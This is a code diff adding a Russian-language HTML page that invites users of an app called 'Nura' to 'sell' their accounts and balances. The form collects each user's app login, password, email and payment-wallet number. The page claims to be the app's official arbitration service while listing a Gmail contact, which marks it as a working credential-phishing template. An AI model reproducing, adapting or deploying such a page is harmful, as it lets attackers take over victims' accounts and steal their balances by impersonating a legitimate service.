@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz,wght@8..144,300;8..144,400;8..144,500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/normalize.css">
+  <link rel="stylesheet" href="css/main.css">
+</head>
+<body>
+  <div class="container center">
+    <div class="title">
+      <h1>Приветствуем!</h1>
+    </div>
+    <h2>Продай свой аккаунт приложения <span>Нура</span> с балансом от 1$</h2>
+    <h3>Для продажи аккаунта заполните форму ниже</h3>
+    <form action="success.html" method="POST">
+      <div class="input-wrapp">
+        <label for="login">Ваш логин в приложении</label>
+        <input type="text" name="login" id="login" placeholder="Логин" required>
+      </div>
+      <div class="input-wrapp">
+        <label for="pass">Ваш пароль от приложения</label>
+        <input type="password" name="pass" id="pass" placeholder="Пароль" required>
+      </div>
+      <div class="input-wrapp">
+        <label for="email">Ваша почта для обратной связи</label>
+        <input type="email" name="email" id="email" placeholder="Email" required>
+      </div>
+      <div class="input-wrapp">
+        <label for="money">Выберите платежную систему</label>
+        <select name="money" id="money">
+          <option value="Qiwi">Qiwi</option>
+          <option value="Payeer">Payeer</option>
+          <option value="PayPal">PayPal</option>
+          <option value="WebMoney">WebMoney</option>
+          <option value="YandexMoney">YandexMoney</option>
+        </select>
+      </div>
+      <div class="input-wrapp">
+        <label for="money-num">Ваш номер кошелька для перевода средств</label>
+        <input type="text" name="money-num" id="money-num" placeholder="Номер кошелька">
+      </div>
+      <div class="info">
+        <p>С баланса вашего аккаунта приложения <span>Нура</span>, переведутся средства на реквезиты, которые вы указали выше,
+          с комиссией 15% за перевод. Ваш аккаунт будет закрыт после перевода средств.</p>
+      </div>
+      <div class="input-wrapp checkbox">
+        <p> <input type="checkbox" name="check" checked required> Я гарантирую, что все средства на балансе приложения <span>Нура</span>, я заработал(а) добросовестно выполняя задания.
+        И предоставлял(а) авторам заданий в приложении, фото для проверки, только касающиеся условий заданий, а не намеренно
+        отправлял(а) стороние фото.</p>
+        <p>Если, в процессе проверки предоставленного мною аккаунта, модератор обнаружит нарушенв добычи средств, я даю согласие
+        на блокировку моего аккаунта, без выплаты средств на указаные мною реквизиты выше.</p>
+      </div>
+      <button>Отправить</button>
+      <p class="ct">Процесс проверки и перевод средств, составляет 3 рабочих дня. <br>Ваши данные не передаются третьим лицам.</p>
+    </form>
+  </div>
+  <footer class="container">
+    <div class="footer-info">
+      Данный сайт, является официальным арбитражем приложения <span>Нура</span>.
+    </div>
+    <div class="contact">
+      По вопросам, пишите на почту - HypaShop.Com @ gmail.com
+    </div>
+  </footer>
+</body>
+</html>
